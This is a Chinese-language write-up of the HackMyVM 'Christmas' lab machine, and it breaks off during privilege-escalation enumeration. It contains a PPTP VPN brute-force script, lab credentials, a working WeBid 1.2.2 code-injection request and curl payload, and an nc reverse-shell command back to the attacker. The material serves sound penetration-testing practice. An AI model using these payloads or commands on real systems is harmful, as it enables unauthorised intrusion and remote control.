---
title: Christmas
author: hgbe02
date: 2024-04-02
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Christmas.html"
---

# Christmas

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019300.png" alt="image-20240402152533182" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.3 -- -A 
```

```css
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp   open  http    syn-ack Apache httpd 2.4.57 ((Debian))
| http-robots.txt: 4 disallowed entries 
|_/ /webid /images /assets
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Massively by HTML5 UP
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1723/tcp open  pptp    syn-ack linux (Firmware: 1)
Service Info: Host: local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
feroxbuster -u http://172.20.10.3
```

```css
200      GET     1250l     7663w   569797c http://172.20.10.3/images/pic07.jpg
200      GET     1277l     7610w   570745c http://172.20.10.3/images/pic02.jpg
200      GET      897l     4455w   349519c http://172.20.10.3/images/pic04.jpg
404      GET        9l       31w      273c http://172.20.10.3/assets/js/assets
200      GET        2l     1294w    89501c http://172.20.10.3/assets/js/jquery.min.js
200      GET        2l       87w     2439c http://172.20.10.3/assets/js/breakpoints.min.js
200      GET        2l       23w      831c http://172.20.10.3/assets/js/jquery.scrolly.min.js
200      GET        2l       52w     2051c http://172.20.10.3/assets/js/browser.min.js
200      GET       46l      104w     1114c http://172.20.10.3/assets/sass/noscript.scss
404      GET        9l       31w      273c http://172.20.10.3/assets/sass/assets
200      GET      213l      409w     3720c http://172.20.10.3/assets/sass/base/_typography.scss
404      GET        9l       31w      273c http://172.20.10.3/assets/sass/base/assets/
200      GET       76l      210w     1569c http://172.20.10.3/assets/sass/base/_reset.scss
404      GET        9l       31w      273c http://172.20.10.3/assets/sass/base/assets/sass
200      GET       48l      117w     1003c http://172.20.10.3/assets/sass/base/_page.scss
404      GET        9l       31w      273c http://172.20.10.3/assets/sass/components/assets/
200      GET      153l      308w     3350c http://172.20.10.3/assets/sass/layout/_navPanel.scss
200      GET       33l       66w      482c http://172.20.10.3/assets/sass/components/_icon.scss
200      GET      158l      318w     2963c http://172.20.10.3/assets/sass/layout/_main.scss
404      GET        9l       31w      273c http://172.20.10.3/assets/sass/layout/assets/sass
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      311c http://172.20.10.3/images => http://172.20.10.3/images/
200      GET      222l      705w     8958c http://172.20.10.3/index.php
200      GET       35l      388w    21736c http://172.20.10.3/images/pic09.jpg
301      GET        9l       28w      311c http://172.20.10.3/assets => http://172.20.10.3/assets/
200      GET     4689l     9230w    84145c http://172.20.10.3/assets/css/main.css
200      GET      126l      542w     5909c http://172.20.10.3/generic.php
200      GET      227l     1027w    84039c http://172.20.10.3/images/pic06.jpg
200      GET      240l     1553w   135811c http://172.20.10.3/images/pic01.jpg
200      GET     1556l     8912w   768128c http://172.20.10.3/images/pic03.jpg
200      GET       12l       46w     5286c http://172.20.10.3/images/overlay.png
200      GET     2005l    12842w  1142518c http://172.20.10.3/images/pic05.jpg
200      GET      258l      507w     5346c http://172.20.10.3/assets/js/main.js
302      GET        9l       26w      291c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET    28815l   179126w 11593919c http://172.20.10.3/images/bg.jpg
200      GET       71l      144w     1743c http://172.20.10.3/assets/sass/main.scss
200      GET       35l       74w      724c http://172.20.10.3/assets/sass/components/_row.scss
200      GET       85l      181w     1900c http://172.20.10.3/assets/sass/layout/_nav.scss
200      GET      243l      541w     5147c http://172.20.10.3/assets/sass/layout/_footer.scss
200      GET       47l      438w    22473c http://172.20.10.3/images/pic08.jpg
200      GET       64l      150w     1569c http://172.20.10.3/assets/sass/layout/_wrapper.scss
200      GET      101l      190w     1788c http://172.20.10.3/assets/sass/components/_actions.scss
200      GET       63l      148w     1648c http://172.20.10.3/assets/sass/layout/_header.scss
200      GET      134l      256w     2690c http://172.20.10.3/assets/sass/components/_button.scss
200      GET      115l      236w     2267c http://172.20.10.3/assets/sass/layout/_intro.scss
200      GET       98l      185w     1499c http://172.20.10.3/assets/sass/components/_list.scss
200      GET      122l      207w     1868c http://172.20.10.3/assets/sass/components/_table.scss
200      GET      293l      589w     5916c http://172.20.10.3/assets/sass/components/_form.scss
200      GET      111l      225w     2312c http://172.20.10.3/assets/sass/components/_pagination.scss
200      GET       52l      103w     1009c http://172.20.10.3/assets/sass/components/_icons.scss
200      GET       34l       77w      618c http://172.20.10.3/assets/sass/components/_box.scss
200      GET      112l      220w     1717c http://172.20.10.3/assets/sass/components/_section.scss
200      GET       92l      162w     1363c http://172.20.10.3/assets/sass/components/_image.scss
200      GET      587l     1232w    12433c http://172.20.10.3/assets/js/util.js
200      GET        2l       37w     2257c http://172.20.10.3/assets/js/jquery.scrollex.min.js
200      GET       36l       93w      931c http://172.20.10.3/assets/css/noscript.css
200      GET       62l      316w    24032c http://172.20.10.3/assets/webfonts/fa-regular-400.woff2
200      GET       60l      377w    29443c http://172.20.10.3/assets/webfonts/fa-regular-400.woff
301      GET        9l       28w      310c http://172.20.10.3/webid => http://172.20.10.3/webid/
200      GET      101l       83w    59401c http://172.20.10.3/assets/css/fontawesome-all.min.css
200      GET      378l     2243w   185256c http://172.20.10.3/assets/webfonts/fa-solid-900.woff
200      GET      362l     1830w    40075c http://172.20.10.3/assets/webfonts/fa-regular-400.eot
200      GET      362l     1818w    39769c http://172.20.10.3/assets/webfonts/fa-regular-400.ttf
200      GET      314l     1692w   139309c http://172.20.10.3/assets/webfonts/fa-brands-400.woff2
200      GET      278l     1760w   142008c http://172.20.10.3/assets/webfonts/fa-solid-900.woff2
200      GET      326l     1951w   162883c http://172.20.10.3/assets/webfonts/fa-brands-400.woff
200      GET     2900l    14901w   234705c http://172.20.10.3/assets/webfonts/fa-solid-900.eot
200      GET      223l      664w     4577c http://172.20.10.3/assets/sass/libs/_breakpoints.scss
200      GET       62l      122w     1215c http://172.20.10.3/assets/sass/libs/_vars.scss
200      GET       78l      266w     2218c http://172.20.10.3/assets/sass/libs/_mixins.scss
200      GET      376l      726w     7355c http://172.20.10.3/assets/sass/libs/_vendor.scss
200      GET      338l      835w     7848c http://172.20.10.3/assets/sass/libs/_fixed-grid.scss
200      GET       90l      279w     1957c http://172.20.10.3/assets/sass/libs/_functions.scss
200      GET      149l      322w     2840c http://172.20.10.3/assets/sass/libs/_html-grid.scss
200      GET     1747l     7283w   149607c http://172.20.10.3/assets/webfonts/fa-brands-400.eot
200      GET     1748l     7270w   149287c http://172.20.10.3/assets/webfonts/fa-brands-400.ttf
200      GET      801l    17193w   144714c http://172.20.10.3/assets/webfonts/fa-regular-400.svg
200      GET     2899l    14888w   234411c http://172.20.10.3/assets/webfonts/fa-solid-900.ttf
200      GET      498l     1812w    22063c http://172.20.10.3/elements.php
200      GET      222l      705w     8958c http://172.20.10.3/
200      GET     3717l    78495w   747927c http://172.20.10.3/assets/webfonts/fa-brands-400.svg
200      GET     5034l   105823w   918991c http://172.20.10.3/assets/webfonts/fa-solid-900.svg
```

```bash
dirb http://172.20.10.3
```

```css
---- Scanning URL: http://172.20.10.3/ ----
==> DIRECTORY: http://172.20.10.3/assets/
==> DIRECTORY: http://172.20.10.3/images/
+ http://172.20.10.3/index.php (CODE:200|SIZE:8958)
+ http://172.20.10.3/robots.txt (CODE:200|SIZE:79)
+ http://172.20.10.3/server-status (CODE:403|SIZE:276)
```

### 漏洞扫描

```bash
nikto -h http://172.20.10.3
```

```css
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.3
+ Target Hostname:    172.20.10.3
+ Target Port:        80
+ Start Time:         2024-04-02 03:20:37 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /assets/: Directory indexing found.
+ /robots.txt: Entry '/assets/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /images/: Directory indexing found.
+ /robots.txt: Entry '/images/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 4 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /login.php: Admin login page/section found.
+ 8105 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2024-04-02 03:20:52 (GMT-4) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞挖掘

### 查看敏感目录

```css
http://172.20.10.3/robots.txt
User-agent: *
Disallow: /
Disallow: /webid
Disallow: /images
Disallow: /assets
```

发生跳转了：

```apl
http://christmas.hmv/login.php
```

添加hosts记录：

```apl
172.20.10.3    christmas.hmv
```

再次访问：

```apl
/webid
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019302.png" alt="image-20240402155302006" style="zoom: 33%;" />

弱密码与万能密码都不行，尝试一下其他办法：

### 查看敏感端口

```bash
1723/tcp open  pptp    syn-ack linux (Firmware: 1)
```

> `1723/tcp open pptp` 表示在 TCP 端口 1723 上检测到了一个开放的服务，并且这个服务被识别为 `pptp`。
>
> `pptp` 是 Point-to-Point Tunneling Protocol 的缩写，它是一种用于在 IP 网络上建立点对点连接的隧道协议。它常用于远程访问和 VPN（虚拟私人网络）解决方案，尤其是当客户端与服务器之间需要进行 PPP（Point-to-Point Protocol）会话时。
>
> 在早期的网络环境中，PPTP 是一种流行的远程访问协议，因为它相对简单并且易于设置。然而，随着时间的推移，由于其安全性的问题，PPTP 逐渐被更安全的协议如 OpenVPN、L2TP/IPsec 和 SSTP 所替代。

### pptp连接远程服务

没有安装的记得安装一下，我自带了不知道为啥：

```bash
sudo apt-get install pptp-linux -y
```

#### 尝试连接服务

```bash
mkdir christmas
cd christmas
┌──(kali💀kali)-[~/temp/christmas]
└─$ pptpsetup --create vpn --server christmas.hmv --username admin --password password --encrypt --start
/usr/sbin/pptpsetup: can't write to '/etc/ppp/chap-secrets': Permission denied
┌──(kali💀kali)-[~/temp/christmas]
└─$ sudo pptpsetup --create vpn --server christmas.hmv --username admin --password password --encrypt --start
```

```bash
pptpsetup --create <TUNNEL> --server <SERVER> [--domain <DOMAIN>]
          --username <USERNAME> [--password <PASSWORD>]
          [--encrypt] [--start]
```

但是会出现认证失败：

```text
Using interface ppp0
Connect: ppp0 <--> /dev/pts/4
MS-CHAP authentication failed: Access denied
CHAP authentication failed
Modem hangup
Connection terminated.
```

### 爆破vpn

这是很正常的，因为我们不知道账号密码，使用`rockyou`字典尝试爆破`vpn`，使用弱用户名`admin`进行尝试，

使用kali自带的`thc-pptp-bruter`不能生效，似乎只能使用shell脚本进行攻击了。。

这里直接借鉴作者的`brutevpn.sh`脚本，思路很简单就是读取字典重复尝试命令，可以的话输出，不可以的话显示正在使用的payload：

```bash
while read -r line ; do
	pptpsetup --create vpn --server christmas.hmv --username admin --password "$line" --encrypt --start &>/dev/null
	echo > /etc/ppp/chap-secrets
	if ip link show ppp0 &>/dev/null ; then
		echo "[+] Password: $line"
		exit 0
	else echo -en "[x] Payload: $line\r"
	fi
done < wordlists	
```

```bash
head -n 100 /usr/share/wordlists/rockyou.txt > wordlists
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019303.png" alt="image-20240402173538200" style="zoom:50%;" />

> 如果不行就重启一下。。。。狗头.jpg

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019304.png" alt="image-20240402173624037" style="zoom: 50%;" />

### 信息搜集

重新看一下网卡，发现多了一个：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019305.png" alt="image-20240402173855504" style="zoom:50%;" />

扫描一下：

```bash
nmap -p 1-65535 192.168.3.1
```

```apl
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 05:42 EDT
Nmap scan report for 192.168.3.1
Host is up (0.0021s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
1723/tcp  open  pptp
8384/tcp  open  marathontp
22000/tcp open  snapenetio

Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

多出来了两个端口，尝试ftp连接一下：

### ftp连接

```bash
ftp 192.168.3.1
```

使用默认的试试：

```apl
Anonymous
```

失败了：

```bash
┌──(root㉿kali)-[/home/kali/temp/christmas]
└─# ftp 192.168.3.1
Connected to 192.168.3.1.
220 Welcome to the christmas.hmv FTP server. Please note that the primary FTP directory is located at /srv/ftp. All activities on this server are monitored and logged. Ensure compliance with our terms of use. Enjoy your session!
Name (192.168.3.1:kali): Anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

但是定位到了`/srv/ftp`，其他的弱密码似乎也进不去。

### 查看开放端口

开放了`8384/tcp  open  marathontp AND 22000/tcp open  snapenetio`

#### 8384端口

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019306.png" alt="image-20240402175623616" style="zoom:50%;" />

> Syncthing是一个开源的文件同步客户端与服务器软件，采用Go语言编写。它可以在本地网络上的设备之间或通过Internet在远程设备之间同步文件，使用了其独有的对等自由块交换协议。Syncthing不依赖于集中式服务器或云存储服务，而是使用点对点的连接方式，在设备之间直接进行通信和同步文件，从而提高了数据的安全性和隐私性。它可以在多个操作系统上运行，包括Windows、macOS、Linux和Android，为用户提供了在不同类型的设备上进行文件同步的便利。此外，Syncthing还提供了一个易于使用的Web界面，使用户可以通过浏览器直接管理和监控其设备和同步任务
>
> Syncthing的工作原理基于设备和文件夹两个核心概念。设备是指可以运行Syncthing软件的任意计算机或移动设备，文件夹则是指在一个设备上指定的共享文件夹，其他设备可以根据需要同步该文件夹中的任意文件或子目录。由于采用了P2P技术，Syncthing在同步数据时，数据并不会上传到某个云服务器上，而是直接在你所指定的几个设备之间传输，并只存储于你所信任的本地设备，确保了隐私与安全。
>
> 总的来说，Syncthing是一个功能强大、安全且私密的文件同步工具，适用于个人用户和企业用户在不同设备间同步文件的需求。

#### 部署并同步syncthing

在本地部署一个，然后将ID加进去，实现两边ftp同步。

```bash
sudo apt-get install syncthing 
```

启动一下：

```bash
syncthing
```

![image-20240402181448887](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019307.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019308.png" alt="image-20240402181533828" style="zoom: 33%;" />

ok！在`Actions`中有我们的用户ID，尝试加入到那个靶场的共享名单中：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019309.png" alt="image-20240402181632265" style="zoom: 33%;" />

```
MAP5NBU-U6CIUEH-FRDHASV-VTATPGY-S4ZYIH5-ZFE3YHF-OIVNLFB-4EPFAQN
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019310.png" alt="image-20240402181722741" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019312.png" alt="image-20240402181743769" style="zoom: 33%;" />

然后回去看到有一个请求：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019313.png" alt="image-20240402181906058" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019314.png" alt="image-20240402181926218" style="zoom:33%;" />

点击`save`。然后添加共享目录，共享上面看到的ftp：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019315.png" alt="image-20240402182123900" style="zoom:33%;" />

然后共享：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019316.png" alt="image-20240402182224290" style="zoom:33%;" />

老样子，同意。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019317.png" alt="image-20240402182307549" style="zoom:33%;" />

### ftp连接

然后我们回头看一下是否真的共享过来了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019318.png" alt="image-20240402182418631" style="zoom: 50%;" />

ok，尝试`unzip`解压：

```bash
┌──(root㉿kali)-[/home/kali/temp/christmas/ftp]
└─# ls
assets  backup.zip  elements.php  generic.php  images  index.php  login.php  robots.txt
```

在`login.php`中发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019319.png" alt="image-20240402182627651" style="zoom:50%;" />

发现账号密码了！

```apl
admin
MyPassword1@2023*
```

### 登录

拿账号密码进行登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019320.png" alt="image-20240402182828273" style="zoom:33%;" />

出现：

```apl
http://christmas.hmv/2fa.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019321.png" alt="image-20240402182844305" style="zoom: 33%;" />

尝试看一下那个`webid`，发现它会跳转到登录界面，尝试规定是从登录以后的界面进去的，即修改`Referer`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019322.png" alt="image-20240402192250568" style="zoom:33%;" />

然后无意间发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019323.png" alt="image-20240402183835454" style="zoom:33%;" />

查看一下这个webid是啥：（或者搜robots.txt的内容）

找到了：https://github.com/renlok/WeBid

发现存在管理员登录页面：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019324.png" alt="image-20240402184201672" style="zoom:33%;" />

进行登录：

```apl
http://christmas.hmv/webid/admin/login.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019325.png" alt="image-20240402184248109" style="zoom:33%;" />

查看一下有无默认的账号密码，没有发现，使用前面的账号密码登录一下，显示登录失败：

```apl
MyPassword1@2023*
```

猜一下密码：

```apl
MyPassword2@2023*
```

登录进去了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019326.png" alt="image-20240402184751890" style="zoom: 33%;" />

版本号为：`1.2.2.2 `

### 漏洞搜集

#### 查一下exploit.db

```bash
┌──(root㉿kali)-[/home/kali/temp/christmas/ftp]
└─# searchsploit webid 1.2.    
Exploits: No Results
Shellcodes: No Results
```

#### github和google找一下

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019327.png" alt="image-20240402185019978" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019328.png" alt="image-20240402185222641" style="zoom:50%;" />

```bash
POST /Webid/admin/categoriestrans.php?lang=.. HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=sg9ouodbv9fupgvdp5ik8vm1d6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

categories[123);system("whoami");/*]=test
```

也可以使用命令行：

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-User: ?1' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 41' \
    -b $'PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92' \
    --data-binary $'categories[123);system(\"whoami\");/*]=test' \
    $'http://localhost/Webid/admin/categoriestrans.php?lang=..'
```

### 漏洞利用

删除没有必要的信息，加上自己的信息，然后就可以运行脚本了：

```bash
sed 's/-H/\\\n-H/g' pwn    				# 换行
sed -i 's/-H/\\\n-H/g' pwn				# 和上一个命令一样，但是不输出到终端
```

然后手动删减一下：

```bash
curl -i -s -k -X $'POST' \
    \
-H $'Host: localhost' \
-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' \
-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh\
-HK;q=0.5,en-US;q=0.3,en;q=0.2' \
-H $'Accept-Encoding: gzip, deflate' \
-H $'Connection: close' \
-H $'Cookie: PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92' \
-H $'Upgrade-Insecure-Requests: 1' \
-H $'Sec-Fetch-Dest: document' \
-H $'Sec-Fetch-Mode: navigate' \
-H $'Sec-Fetch-Site: none' \
-H $'Sec-Fetch-User: ?1' \
-H $'Content-Type: application/x-www-form-urlencoded' \
-H $'Content-Length: 41' \
    -b $'PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92' \
    --data-binary $'categories[123);system(\"whoami\");/*]=test' \
    $'http://localhost/Webid/admin/categoriestrans.php?lang=..'
```

删完不必要的东西以后，添加referer：

```bash
curl -i -s -k -X $'POST' \
-H $'Host: localhost' \
-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' \
-H $'Referer: http://christmas.hmv/2fa.php' \
-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H $'Connection: close' \
-H $'Cookie: PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92' \
-H $'Upgrade-Insecure-Requests: 1' \
-H $'Sec-Fetch-Dest: document' \
-H $'Sec-Fetch-Mode: navigate' \
-H $'Sec-Fetch-Site: none' \
-H $'Sec-Fetch-User: ?1' \
-H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92' \
    --data-binary $'categories[123);system(\"whoami\");/*]=test' \
    $'http://localhost/webid/admin/categoriestrans.php?lang=..'
```

```bash
sed -i 's/PHPSESSID=vnl6peqqqk68l3pfdvf6f7om92/PHPSESSID=sg9ouodbv9fupgvdp5ik8vm1d6;UserAuthenticated=true/g' pwn   # 更改cookie
```

```bash
sed -i 's/localhost/christmas.hmv/g' pwn  		# 切换靶场网址
```

```bash
curl -i -s -k -X $'POST' \
-H $'Host: christmas.hmv' \
-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' \
-H $'Referer: http://christmas.hmv/2fa.php' \
-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
-H $'Connection: close' \
-H $'Cookie: PHPSESSID=sg9ouodbv9fupgvdp5ik8vm1d6;UserAuthenticated=true' \
-H $'Upgrade-Insecure-Requests: 1' \
-H $'Sec-Fetch-Dest: document' \
-H $'Sec-Fetch-Mode: navigate' \
-H $'Sec-Fetch-Site: none' \
-H $'Sec-Fetch-User: ?1' \
-H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=sg9ouodbv9fupgvdp5ik8vm1d6;UserAuthenticated=true' \
    --data-binary $'categories[123);system(\"whoami\");/*]=test' \
    $'http://christmas.hmv/webid/admin/categoriestrans.php?lang=..'
```

测试一下发现成功了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019329.png" alt="image-20240402194847216" style="zoom:50%;" />

下面还有但是我没加上去了，反弹shell：

```bash
nc -e /bin/bash 172.20.10.8 1234
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019330.png" alt="image-20240402195221524" style="zoom:33%;" />



<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404022019331.png" alt="image-20240402195233488" style="zoom:33%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@christmas.hmv:/var/www/html/webid/admin$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
ftp:x:104:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:105:113:MySQL Server,,,:/nonexistent:/bin/false
mr-jack:x:1000:1000::/home/mr-jack:/bin/zsh
(remote) www-data@christmas.hmv:/var/www/html/webid/admin$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
cat: /etc/cron.yearly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
(remote) www-data@christmas.hmv:/var/www/html/webid/admin$ cd /home/mr-jack
(remote) www-data@christmas.hmv:/home/mr-jack$ ls -la
total 388
drwxr-xr-x  6 mr-jack mr-jack   4096 Nov 18 12:58 .
